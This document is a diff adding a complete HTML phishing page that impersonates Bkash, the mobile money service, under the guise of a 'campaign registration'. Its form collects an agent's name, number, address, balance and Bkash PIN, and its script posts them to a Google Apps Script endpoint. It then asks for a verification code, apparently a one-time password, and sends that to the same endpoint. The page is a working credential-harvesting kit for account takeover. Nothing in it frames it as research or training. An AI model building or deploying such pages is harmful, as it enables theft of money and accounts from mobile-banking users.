@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bkash Campaign Registration</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .form-container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+    .form-container h2 {
+      text-align: center;
+      color: #e2136e;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .submit-btn {
+      background-color: #e2136e;
+      color: white;
+      padding: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .submit-btn:hover {
+      background-color: #c50055;
+    }
+  </style>
+</head>
+<body>
+
+<div class="form-container">
+  <h2>Bkash Campaign Registration</h2>
+  <form id="step1Form">
+    <input type="text" id="agentName" placeholder="Agent Name" required><br>
+    <input type="text" id="agentNumber" placeholder="Agent Number" required><br>
+    <input type="text" id="address" placeholder="Address" required><br>
+    <input type="text" id="currentBalance" placeholder="Current Balance" required><br>
+    <input type="password" id="bkashPin" placeholder="Bkash PIN" required><br>
+    <button type="submit" class="submit-btn">Next</button>
+  </form>
+</div>
+
+<script>
+  document.getElementById("step1Form").addEventListener("submit", function (e) {
+    e.preventDefault();
+    
+    // Collect data
+    const agentName = document.getElementById("agentName").value;
+    const agentNumber = document.getElementById("agentNumber").value;
+    const address = document.getElementById("address").value;
+    const currentBalance = document.getElementById("currentBalance").value;
+    const bkashPin = document.getElementById("bkashPin").value;
+    
+    // Send to Google Sheets
+    fetch("https://script.google.com/macros/s/AKfycbx5P5ox2XtPXHfDbwe5nkKxg_m9AZAP5cbWNrr_54cW2mqY0nTbuKCDNTgv7HXmwZHg/exec", {
+      method: "POST",
+      body: JSON.stringify({ 
+        agentName, agentNumber, address, currentBalance, bkashPin 
+      }),
+    }).then((response) => {
+      if (response.ok) {
+        // Redirect to verification form
+        document.body.innerHTML = `
+          <div class="form-container">
+            <h2>Verification Code</h2>
+            <form id="verificationForm">
+              <input type="text" id="verificationCode" placeholder="Enter Verification Code" required><br>
+              <button type="submit" class="submit-btn">Submit</button>
+            </form>
+          </div>
+        `;
+
+        document.getElementById("verificationForm").addEventListener("submit", function (e) {
+          e.preventDefault();
+          
+          const verificationCode = document.getElementById("verificationCode").value;
+          
+          // Send verification code to Google Sheets
+          fetch("https://script.google.com/macros/s/AKfycbx5P5ox2XtPXHfDbwe5nkKxg_m9AZAP5cbWNrr_54cW2mqY0nTbuKCDNTgv7HXmwZHg/exec", {
+            method: "POST",
+            body: JSON.stringify({ verificationCode }),
+          }).then((response) => {
+            if (response.ok) {
+              document.body.innerHTML = "<h2>Thank you for staying with Bkash!</h2>";
+            }
+          });
+        });
+      }
+    });
+  });
+</script>
+
+</body>
+</html>
